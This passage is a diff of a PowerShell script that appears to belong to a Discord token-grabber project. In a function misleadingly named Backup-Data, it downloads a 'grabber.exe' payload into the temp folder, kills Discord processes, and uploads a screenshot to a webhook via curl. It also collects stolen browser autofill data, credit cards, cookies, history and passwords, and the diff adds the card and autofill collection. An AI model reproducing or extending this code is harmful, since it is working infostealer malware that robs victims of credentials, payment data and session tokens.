@@ -816,7 +816,7 @@ function Backup-Data {
     #}
     #catch {}
 
-    (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
+    (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/AutoBuild/grabber.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
     Stop-Process -Name "discord" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
     Stop-Process -Name "discordcanary" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
@@ -843,11 +843,15 @@ function Backup-Data {
     $bmp.Dispose()
     curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n> :triangular_ruler: **Size:** $($bounds.width)x$($bounds.height)\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null
 
-    Move-Item "$main_temp\tokens.txt" $folder_general -Force	
-    Move-Item "$main_temp\screenshot.png" $folder_general -Force
-    Move-Item -Path "$main_temp\browser-cookies.txt" -Destination "$browser_data" -Force
-    Move-Item -Path "$main_temp\browser-history.txt" -Destination "$browser_data" -Force
-    Move-Item -Path "$main_temp\browser-passwords.txt" -Destination "$browser_data" -Force
+    #TODO ill fix tokens tomorrow
+    #Move-Item "$main_temp\tokens.txt" $folder_general -Force	
+    #Move-Item "$main_temp\screenshot.png" $folder_general -Force
+    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
+    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
+    Move-Item -Path "$main_temp\cookies.json" -Destination "$browser_data" -Force
+    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force
+    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force
+    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force
 
     #remove empty dirs
     do {
